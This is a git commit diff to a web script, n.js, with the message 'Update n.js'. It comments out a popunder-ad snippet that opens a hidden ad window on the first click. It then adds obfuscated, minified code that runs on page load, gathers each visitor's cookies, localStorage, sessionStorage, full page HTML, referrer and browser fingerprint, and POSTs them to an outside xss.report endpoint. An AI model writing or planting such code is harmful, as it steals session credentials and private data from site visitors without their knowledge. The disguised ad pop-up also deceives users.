c2fff901aa9c14c90851e42aec783282675bf9d8
Poul <evsyukovandrey@yandex.ru>
2025-08-03 19:51:32 +0300

    Update n.js

--- n.js
+++ n.js
@@ -1,17 +1,20 @@
-console.log('Хуяк2')
-document.addEventListener('click', function openPopunder() {
-  document.removeEventListener('click', openPopunder);
+// console.log('Хуяк2')
+// document.addEventListener('click', function openPopunder() {
+//   document.removeEventListener('click', openPopunder);
   
-  const currentUrl = encodeURIComponent(window.location.href);
-  const base64Url = btoa(encodeURIComponent(currentUrl));
+//   const currentUrl = encodeURIComponent(window.location.href);
+//   const base64Url = btoa(encodeURIComponent(currentUrl));
   
-  const popunderUrl = `https://djhfm.fastestrtbads.com/?pl=-gXhr3sUlEuGwvrrq4bBtA&sub_id=${base64Url}`;
-  const popunder = window.open(
-    popunderUrl
-  );
+//   const popunderUrl = `https://djhfm.fastestrtbads.com/?pl=-gXhr3sUlEuGwvrrq4bBtA&sub_id=${base64Url}`;
+//   const popunder = window.open(
+//     popunderUrl
+//   );
   
-  if (popunder) {
-    popunder.blur();
-    window.focus();
-  }
-}, { once: true });
+//   if (popunder) {
+//     popunder.blur();
+//     window.focus();
+//   }
+// }, { once: true });
+
+
+var r_Jn = {};function prs(t){return void 0!==t?t:""}function x_po(t){var r=new XMLHttpRequest;r.open("POST","https://xss.report/c/probot",!0),r.setRequestHeader("Content-type","text/plain"),r.onreadystatechange=function(){4==r.readyState&&r.status},r.send(JSON.stringify(t))}function x_PS(){try{r_Jn.uri=prs(location.toString())}catch(t){r_Jn.uri=""}try{r_Jn.cookies=prs(document.cookie)}catch(t){r_Jn.cookies=""}try{r_Jn.referrer=prs(document.referrer)}catch(t){r_Jn.referrer=""}try{r_Jn["user-agent"]=prs(navigator.userAgent)}catch(t){r_Jn["user-agent"]=""}try{r_Jn.origin=prs(location.origin)}catch(t){r_Jn.origin=""}try{var t=navigator.language||navigator.userLanguage;r_Jn.lang=prs(t)}catch(t){r_Jn.lang=""}try{var r=document.createElement("canvas"),e=r.getContext("webgl")||r.getContext("experimental-webgl"),n=e.getExtension("webgl_debug_renderer_info"),o=e.getParameter(n.UNMASKED_RENDERER_WEBGL);r_Jn.gpu=prs(o)}catch(t){r_Jn.gpu=""}try{r_Jn.localstorage=window.localStorage}catch(t){r_Jn.localstorage=""}try{r_Jn.sessionstorage=window.sessionStorage}catch(t){r_Jn.sessionstorage=""}try{r_Jn.dom=prs(document.documentElement.outerHTML)}catch(t){r_Jn.dom=""}try{r_Jn.screenshot="",a()}catch(t){r_Jn.screenshot="",a()}function a(){o_js(),x_po(r_Jn)}}function j_ls(t,r,e){t.addEventListener?t.addEventListener(r,e,!1):t.attachEvent&&t.attachEvent("on"+r,e)}function o_js(){}r_Jn={},"complete"==document.readyState?x_PS():j_ls(window,"load",(function(){x_PS()}));
